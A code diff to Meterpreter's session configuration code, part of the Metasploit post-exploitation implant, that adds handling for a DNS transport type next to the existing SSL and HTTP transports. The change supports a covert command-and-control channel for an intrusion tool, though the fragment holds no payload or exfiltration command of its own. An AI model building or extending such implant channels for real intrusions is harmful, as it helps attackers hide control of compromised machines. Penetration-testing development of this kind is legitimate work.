@@ -254,9 +254,9 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	do
 	{
 		// extend memory appropriately
-		DWORD neededSize = t->type == METERPRETER_TRANSPORT_SSL ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);
+		DWORD neededSize = t->type == METERPRETER_TRANSPORT_SSL ? sizeof(MetsrvTransportTcp) : ( t->type == METERPRETER_TRANSPORT_DNS ? sizeof(MetsrvTransportDns) : sizeof(MetsrvTransportHttp));
 
-		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_SSL ? "ssl" : "http/s", s);
+		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_SSL ? "ssl" : ( t->type == METERPRETER_TRANSPORT_DNS ? "dns" :"http/s"), s);
 
 		sess = (MetsrvSession*)realloc(sess, s + neededSize);
 
@@ -279,7 +279,10 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 			{
 				sess->comms_fd = (DWORD)t->get_socket(t);
 			}
-		}
+		} else if ((t->type == METERPRETER_TRANSPORT_DNS))
+        {
+            transport_write_dns_config(t, (MetsrvTransportDns*)target);
+        }
 		else
 		{
 			transport_write_http_config(t, (MetsrvTransportHttp*)target);
